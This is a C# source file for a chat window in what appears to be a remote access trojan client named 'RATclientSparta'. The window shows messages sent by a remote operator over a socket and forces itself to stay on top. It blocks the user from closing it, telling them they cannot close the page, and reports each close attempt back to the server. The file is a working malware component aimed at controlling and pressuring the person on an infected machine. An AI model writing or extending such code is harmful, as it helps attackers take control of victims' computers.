﻿using RATclientSparta.Server;
using RATclientSparta.Server.Send;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using static RATclientSparta.Server.ServerData;

namespace RATclientSparta.Tools.Chat
{
    public partial class Chat : Form
    {
        private SendData client;
        private ServerData server;
        private Socket socket;
        private bool formClose = false;
        public Chat(ServerData server)
        {
            InitializeComponent();
            this.server = server;
            this.socket = server.SocketConnection;
            this.client = new SendData(socket, false);
        }

        private void button1_Click(object sender, EventArgs e)
        {
            client.Send(Encoding.ASCII.GetBytes(Talk.Text), 1);
            textBox.Text += "You: " + Talk.Text + Environment.NewLine;
            Talk.Text = "";
        }

        private void Chat_Load(object sender, EventArgs e)
        {
            this.TopMost = true;
            this.StartPosition = FormStartPosition.CenterScreen;
            server.ChatMessageEvent += UpdatingMessages;
            server.LostConnectionEvent += LostConnection;
            this.FormClosing += FormClose;
        }
        private void UpdatingMessages(byte[] ByteMessage)
        {
            string message = Encoding.ASCII.GetString(ByteMessage);

            if (message == "\0")
            {
                this.formClose = true;
                this.Invoke((MethodInvoker)delegate
                {
                    this.Close();
                });
            }
            else
            {
                this.Invoke((MethodInvoker)delegate
                {
                    textBox.Text += "Server: " + message + Environment.NewLine;
                });
            }
        }

        private void LostConnection()
        {
            server.ChatMessageEvent -= UpdatingMessages;
            server.LostConnectionEvent -= LostConnection;

            this.formClose = true;
            this.Invoke((MethodInvoker)delegate
            {
                this.Close();
            });
        }
        void FormClose(object sender, FormClosingEventArgs e)
        {
            if (this.formClose != true)
            {
                e.Cancel = true;
                client.Send(Encoding.ASCII.GetBytes("Client tried to close the page."), 1);
                textBox.Text += "You: " + "You cannot close this page." + Environment.NewLine;
            }
        }
    }
}
